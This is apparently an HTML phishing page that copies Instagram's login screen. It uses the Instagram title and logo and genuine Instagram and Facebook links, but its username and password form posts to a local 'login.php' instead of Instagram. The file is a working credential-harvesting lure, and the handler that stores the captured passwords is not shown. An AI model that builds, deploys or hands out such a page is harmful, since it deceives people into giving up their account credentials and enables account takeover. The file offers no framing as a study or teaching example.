<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="css/main.css">
</head>
<body>
 <div class=main-box>
    <img src="images/insta.png" class="insta">
    <br><br><br><br><br><br><br>
    <form action="login.php" method="POST">
        <table>
            <div class="user">
            <tr>
                <td>
                    <label></label>
                <input type="text/number" placeholder="Phone number,username, or email" name="email">
                </td>
            </tr>
            </div>
        </table>
        <table>
            <tr>
                <td class="pwd"><label></label>
                <input type="password" minlength="8" placeholder="Password" name="pass">
            </td>
            </tr>
        </table>
        <br>
        <button type="submit">Log In</button>
    </form>
    <br>
    <br>
    <h4>_________________OR_________________</h4>
    <a href="https://www.facebook.com/">
        <img src="images/facebook.png">
    </a>
    <ul>
    <ul><a class="loginfb" href="https://www.facebook.com/">Log in with Facebook</a></ul>
    <br>
    <ul><a class ="resetpwd"href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></ul>
    </ul>
</div>
<br>
<div class="signup">
    <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/"> Sign up
        </a>
    </p>
</div>
    <div class="final"> 
        <p>Get the app.</p>
    </div>
    <br>    
    <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="images/apple.png" class="apple"></a>
    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb&utm_campaign=loginPage&ig_mid=49C1E1F1-CA0D-4224-86DD-4223F5554A94&utm_content=lo&utm_medium=badge"><img src="images/google.png" class="google"></a>
 
</body>
</html>